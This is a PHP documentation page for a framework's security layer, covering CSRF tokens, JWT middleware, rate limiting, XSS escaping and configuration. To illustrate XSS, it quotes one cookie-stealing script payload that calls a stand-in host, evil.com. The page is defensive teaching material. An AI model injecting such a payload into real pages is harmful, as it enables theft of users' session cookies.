<?php
/**
 * Security Layer Documentation Page
 *
 * Complete security layer documentation covering CSRF, JWT, Rate Limiting, XSS.
 */

$pageTitle = 'Security Layer';
$pageIcon = 'shield-lock';
$toc = [
    ['id' => 'overview', 'title' => 'Overview', 'level' => 2],
    ['id' => 'csrf-protection', 'title' => 'CSRF Protection', 'level' => 2],
    ['id' => 'jwt-authentication', 'title' => 'JWT Authentication', 'level' => 2],
    ['id' => 'rate-limiting', 'title' => 'Rate Limiting', 'level' => 2],
    ['id' => 'xss-prevention', 'title' => 'XSS Prevention', 'level' => 2],
    ['id' => 'configuration', 'title' => 'Configuration', 'level' => 2],
    ['id' => 'best-practices', 'title' => 'Best Practices', 'level' => 2],
    ['id' => 'troubleshooting', 'title' => 'Troubleshooting', 'level' => 2],
];
$breadcrumbs = [['label' => 'Security Layer']];
$lastUpdated = '2026-01-30';

include __DIR__ . '/../_layout.php';
?>

<!-- Header -->
<h1 id="security-layer" class="heading heading-1">
    <span class="mdi mdi-shield-lock heading-icon"></span>
    <span class="heading-text">Security Layer</span>
</h1>

<p class="text-lead">
    Enterprise-grade protection against common web vulnerabilities following OWASP guidelines.
</p>

<div class="flex gap-2 mb-4">
    <span class="badge badge-stable">Production Ready</span>
    <span class="badge badge-success">95% Test Coverage</span>
</div>

<!-- Overview -->
<h2 id="overview" class="heading heading-2">
    <span class="mdi mdi-information heading-icon"></span>
    <span class="heading-text">Overview</span>
</h2>

<?= dataTable(
    ['Feature', 'Purpose', 'Protection Against'],
    [
        ['<strong>CSRF Protection</strong>', 'Token-based form validation', 'Cross-Site Request Forgery'],
        ['<strong>JWT Authentication</strong>', 'Stateless API authentication', 'Unauthorized access'],
        ['<strong>Rate Limiting</strong>', 'Request throttling', 'Brute force, DoS attacks'],
        ['<strong>XSS Prevention</strong>', 'Input/output sanitization', 'Script injection'],
    ]
) ?>

<h3 class="heading heading-3">
    <span class="heading-text">Security Architecture</span>
</h3>

<div class="middleware-flow">
    <div class="flow-box flow-request">
        <div class="flow-box-icon"><span class="mdi mdi-arrow-down-circle"></span></div>
        <div class="flow-box-title">Request</div>
    </div>

    <div class="flow-arrow-down"><span class="mdi mdi-arrow-down"></span></div>

    <div class="flow-box flow-middleware">
        <div class="flow-box-icon"><span class="mdi mdi-shield-check"></span></div>
        <div class="flow-box-title">CsrfMiddleware</div>
        <div class="flow-box-meta">Validates CSRF token</div>
    </div>

    <div class="flow-arrow-down"><span class="mdi mdi-arrow-down"></span></div>

    <div class="flow-box flow-middleware">
        <div class="flow-box-icon"><span class="mdi mdi-key"></span></div>
        <div class="flow-box-title">JwtMiddleware</div>
        <div class="flow-box-meta">Validates JWT token (API routes)</div>
    </div>

    <div class="flow-arrow-down"><span class="mdi mdi-arrow-down"></span></div>

    <div class="flow-box flow-middleware">
        <div class="flow-box-icon"><span class="mdi mdi-speedometer"></span></div>
        <div class="flow-box-title">ThrottleMiddleware</div>
        <div class="flow-box-meta">Checks rate limits</div>
    </div>

    <div class="flow-arrow-down"><span class="mdi mdi-arrow-down"></span></div>

    <div class="flow-box flow-application">
        <div class="flow-box-icon"><span class="mdi mdi-application"></span></div>
        <div class="flow-box-title">Your Application</div>
    </div>

    <div class="flow-arrow-down"><span class="mdi mdi-arrow-down"></span></div>

    <div class="flow-box flow-response">
        <div class="flow-box-icon"><span class="mdi mdi-arrow-up-circle"></span></div>
        <div class="flow-box-title">Response</div>
        <div class="flow-box-meta">with sanitized output</div>
    </div>
</div>

<!-- CSRF Protection -->
<h2 id="csrf-protection" class="heading heading-2">
    <span class="mdi mdi-shield-check heading-icon"></span>
    <span class="heading-text">CSRF Protection</span>
</h2>

<?= callout('warning', '<strong>What is CSRF?</strong><br>Cross-Site Request Forgery tricks authenticated users into performing unwanted actions via malicious links or forms.', null, 'alert') ?>

<h3 class="heading heading-3">
    <span class="heading-text">How It Works</span>
</h3>

<ol class="list">
    <li>User visits your form</li>
    <li>Generate unique CSRF token</li>
    <li>Embed token in form (hidden field)</li>
    <li>User submits form</li>
    <li>Middleware validates token</li>
    <li>Token matches → Allow | Invalid → Reject (419)</li>
</ol>

<h3 class="heading heading-3">
    <span class="heading-text">Usage</span>
</h3>

<?= codeTabs([
    ['label' => 'Form', 'lang' => 'php', 'code' => '<form method="POST" action="/invoices">
    <?= csrf_field() ?>

    <input type="text" name="invoice_number">
    <button type="submit">Create Invoice</button>
</form>'],
    ['label' => 'JavaScript', 'lang' => 'javascript', 'code' => 'fetch(\'/api/endpoint\', {
    method: \'POST\',
    headers: {
        \'X-CSRF-TOKEN\': document.querySelector(\'meta[name="csrf-token"]\').content,
        \'Content-Type\': \'application/json\'
    },
    body: JSON.stringify(data)
});'],
    ['label' => 'Regenerate', 'lang' => 'php', 'code' => 'public function login(Request $request)
{
    // Authenticate user
    auth()->login($user);

    // Regenerate CSRF token
    Csrf::regenerate();

    return redirect(\'/dashboard\');
}'],
]) ?>

<h3 class="heading heading-3">
    <span class="heading-text">Implementation</span>
</h3>

<?= codeBlockWithFile('php', '<?php

namespace Core\Security;

class Csrf
{
    protected static ?string $token = null;

    public static function token(): string
    {
        if (self::$token === null) {
            self::$token = session()->get(\'_csrf_token\');
            if (!self::$token) {
                self::$token = bin2hex(random_bytes(32));
                session()->put(\'_csrf_token\', self::$token);
            }
        }
        return self::$token;
    }

    public static function verify(string $token): bool
    {
        return hash_equals(self::token(), $token);
    }

    public static function regenerate(): string
    {
        self::$token = bin2hex(random_bytes(32));
        session()->put(\'_csrf_token\', self::$token);
        return self::$token;
    }
}', 'core/Security/Csrf.php') ?>

<!-- JWT Authentication -->
<h2 id="jwt-authentication" class="heading heading-2">
    <span class="mdi mdi-key-variant heading-icon"></span>
    <span class="heading-text">JWT Authentication</span>
</h2>

<p>JSON Web Token - Stateless authentication for APIs. No session storage needed!</p>

<h3 class="heading heading-3">
    <span class="heading-text">Token Structure</span>
</h3>

<?= codeBlock('text', 'header.payload.signature
eyJhbGc...  .eyJ1c2Vy... .SflKxwRJ...

{
  "header": {"typ": "JWT", "alg": "HS256"},
  "payload": {"user_id": 123, "exp": 1735478400},
  "signature": "..."
}') ?>

<h3 class="heading heading-3">
    <span class="heading-text">Login Endpoint</span>
</h3>

<?= codeBlock('php', 'public function login(Request $request)
{
    if (!auth()->attempt($request->only([\'email\', \'password\']))) {
        return Response::json([\'error\' => \'Invalid credentials\'], 401);
    }

    $user = auth()->user();

    // Generate JWT token
    $jwt = app(\'jwt\');
    $token = $jwt->encode([
        \'user_id\' => $user->id,
        \'email\' => $user->email,
    ], 3600); // 1 hour expiration

    return Response::json([
        \'token\' => $token,
        \'user\' => $user->toArray()
    ]);
}') ?>

<h3 class="heading heading-3">
    <span class="heading-text">JWT Middleware</span>
</h3>

<?= codeBlockWithFile('php', 'public function handle(Request $request, Closure $next)
{
    $token = $request->bearerToken();

    if (!$token) {
        return Response::json([\'error\' => \'Token not provided\'], 401);
    }

    try {
        $jwt = app(\'jwt\');
        $payload = $jwt->decode($token);

        // Attach user to request
        $request->setUser($payload);

        return $next($request);
    } catch (\Exception $e) {
        return Response::json([\'error\' => $e->getMessage()], 401);
    }
}', 'app/Middleware/JwtMiddleware.php') ?>

<!-- Rate Limiting -->
<h2 id="rate-limiting" class="heading heading-2">
    <span class="mdi mdi-speedometer heading-icon"></span>
    <span class="heading-text">Rate Limiting</span>
</h2>

<?= callout('info', '<strong>Without Rate Limiting:</strong> Attacker tries 1000 passwords/second → Account compromised in minutes<br><strong>With Rate Limiting:</strong> 5 attempts/minute → Attack takes 200 minutes') ?>

<h3 class="heading heading-3">
    <span class="heading-text">Usage</span>
</h3>

<?= codeBlock('php', 'public function login(Request $request)
{
    $rateLimiter = app(\'rate.limiter\');
    $key = \'login:\' . $request->ip();

    // Check rate limit
    if ($rateLimiter->tooManyAttempts($key, 5)) {
        $seconds = $rateLimiter->availableIn($key);
        return Response::json([
            \'error\' => "Too many attempts. Try again in {$seconds} seconds."
        ], 429);
    }

    if (!auth()->attempt($request->only([\'email\', \'password\']))) {
        // Increment failed attempts
        $rateLimiter->hit($key, 1);
        return Response::json([\'error\' => \'Invalid credentials\'], 401);
    }

    // Clear attempts on success
    $rateLimiter->clear($key);

    return Response::json([\'token\' => generateToken()]);
}') ?>

<h3 class="heading heading-3">
    <span class="heading-text">Middleware Usage</span>
</h3>

<?= codeBlock('php', '// throttle:60,1 = 60 requests per minute
Route::middleware([\'throttle:60,1\'])->group(function() {
    Route::get(\'/search\', \'SearchController@index\');
});') ?>

<!-- XSS Prevention -->
<h2 id="xss-prevention" class="heading heading-2">
    <span class="mdi mdi-code-not-equal heading-icon"></span>
    <span class="heading-text">XSS Prevention</span>
</h2>

<?= callout('danger', '<strong>XSS Attack Example:</strong><br>User submits <code class="code-inline">&lt;script&gt;fetch(\'evil.com?\'+document.cookie)&lt;/script&gt;</code> as their name. Without escaping, it executes on every page!', null, 'alert') ?>

<h3 class="heading heading-3">
    <span class="heading-text">Always Escape Output</span>
</h3>

<?= codeTabs([
    ['label' => 'Good', 'lang' => 'php', 'code' => '<!-- Safe - escaped -->
<h1>Welcome <?= e($user->name) ?></h1>'],
    ['label' => 'Bad', 'lang' => 'php', 'code' => '<!-- Vulnerable to XSS! -->
<h1>Welcome <?= $user->name ?></h1>'],
]) ?>

<h3 class="heading heading-3">
    <span class="heading-text">Sanitizer Class</span>
</h3>

<?= codeBlock('php', '// Escape HTML entities
$safe = Sanitizer::escape($userInput);

// Strip dangerous HTML tags
$content = Sanitizer::stripTags($html, [\'p\', \'a\', \'strong\']);

// Sanitize filenames
$filename = Sanitizer::filename($_FILES[\'doc\'][\'name\']);') ?>

<!-- Configuration -->
<h2 id="configuration" class="heading heading-2">
    <span class="mdi mdi-cog heading-icon"></span>
    <span class="heading-text">Configuration</span>
</h2>

<?= codeTabs([
    ['label' => '.env', 'lang' => 'ini', 'code' => '# CSRF Protection
CSRF_ENABLED=true

# JWT Authentication
JWT_SECRET=your-secret-key-change-this-in-production
JWT_ALGORITHM=HS256
JWT_TTL=3600

# Rate Limiting
RATE_LIMIT_ENABLED=true'],
    ['label' => 'config/security.php', 'lang' => 'php', 'code' => '<?php

return [
    \'csrf\' => [
        \'enabled\' => env(\'CSRF_ENABLED\', true),
        \'except\' => [
            \'api/*\',
            \'webhooks/*\',
        ],
    ],

    \'jwt\' => [
        \'secret\' => env(\'JWT_SECRET\'),
        \'algorithm\' => env(\'JWT_ALGORITHM\', \'HS256\'),
        \'ttl\' => env(\'JWT_TTL\', 3600),
    ],

    \'rate_limit\' => [
        \'enabled\' => env(\'RATE_LIMIT_ENABLED\', true),
        \'default\' => \'60,1\',
    ],
];'],
]) ?>

<!-- Best Practices -->
<h2 id="best-practices" class="heading heading-2">
    <span class="mdi mdi-check-decagram heading-icon"></span>
    <span class="heading-text">Best Practices</span>
</h2>

<div class="grid grid-2 gap-4">
    <div>
        <h3 class="heading heading-3 text-success">
            <span class="heading-text"><span class="mdi mdi-check"></span> CSRF Tokens</span>
        </h3>
        <ul class="list list-check">
            <li>Include in all forms</li>
            <li>Regenerate after login/logout</li>
            <li>Use <code class="code-inline">csrf_field()</code> helper</li>
            <li>Validate POST/PUT/DELETE</li>
        </ul>
    </div>
    <div>
        <h3 class="heading heading-3 text-success">
            <span class="heading-text"><span class="mdi mdi-check"></span> JWT Tokens</span>
        </h3>
        <ul class="list list-check">
            <li>Strong secret keys (256+ bits)</li>
            <li>Appropriate expiration</li>
            <li>Always use HTTPS</li>
            <li>Validate on every request</li>
        </ul>
    </div>
    <div>
        <h3 class="heading heading-3 text-success">
            <span class="heading-text"><span class="mdi mdi-check"></span> Rate Limiting</span>
        </h3>
        <ul class="list list-check">
            <li>Limit login (5-10/min)</li>
            <li>Limit API (60-100/min)</li>
            <li>Per-user and per-IP limits</li>
            <li>Return proper 429 status</li>
        </ul>
    </div>
    <div>
        <h3 class="heading heading-3 text-success">
            <span class="heading-text"><span class="mdi mdi-check"></span> XSS Prevention</span>
        </h3>
        <ul class="list list-check">
            <li>Always escape user input</li>
            <li>Use <code class="code-inline">e()</code> helper</li>
            <li>Sanitize rich text</li>
            <li>Validate file uploads</li>
        </ul>
    </div>
</div>

<!-- Troubleshooting -->
<h2 id="troubleshooting" class="heading heading-2">
    <span class="mdi mdi-wrench heading-icon"></span>
    <span class="heading-text">Troubleshooting</span>
</h2>

<div class="space-y-3">
    <?= callout('warning', '
        <strong>CSRF Token Mismatch (419 Error)</strong>
        <ul class="list mt-2">
            <li>Check token is being sent: <code class="code-inline">var_dump($request->input(\'_token\'))</code></li>
            <li>Verify session is working: <code class="code-inline">var_dump(session()->get(\'_csrf_token\'))</code></li>
            <li>Ensure middleware is applied to route</li>
        </ul>
    ') ?>

    <?= callout('warning', '
        <strong>JWT Token Invalid (401 Error)</strong>
        <ul class="list mt-2">
            <li>Check token format: <code class="code-inline">header.payload.signature</code></li>
            <li>Verify secret matches on encode/decode</li>
            <li>Check expiration: <code class="code-inline">$payload[\'exp\'] > time()</code></li>
        </ul>
    ') ?>

    <?= callout('warning', '
        <strong>Rate Limit Too Restrictive</strong>
        <ul class="list mt-2">
            <li>Increase limits: <code class="code-inline">throttle:100,1</code></li>
            <li>Use per-user limits for authenticated users</li>
            <li>Consider higher limits for trusted IPs</li>
        </ul>
    ') ?>
</div>

<!-- Production Checklist -->
<h3 class="heading heading-3">
    <span class="heading-text">Production Checklist</span>
</h3>

<ul class="list list-check">
    <li>Set strong <code class="code-inline">JWT_SECRET</code> (256+ bits)</li>
    <li>Enable CSRF protection (<code class="code-inline">CSRF_ENABLED=true</code>)</li>
    <li>Enable rate limiting (<code class="code-inline">RATE_LIMIT_ENABLED=true</code>)</li>
    <li>Configure HTTPS (required for JWT)</li>
    <li>Set appropriate rate limits</li>
    <li>Review CSRF exceptions</li>
    <li>Test all authentication flows</li>
    <li>Enable XSS auto-escaping</li>
    <li>Configure Content Security Policy headers</li>
</ul>

<?php include __DIR__ . '/../_layout-end.php'; ?>
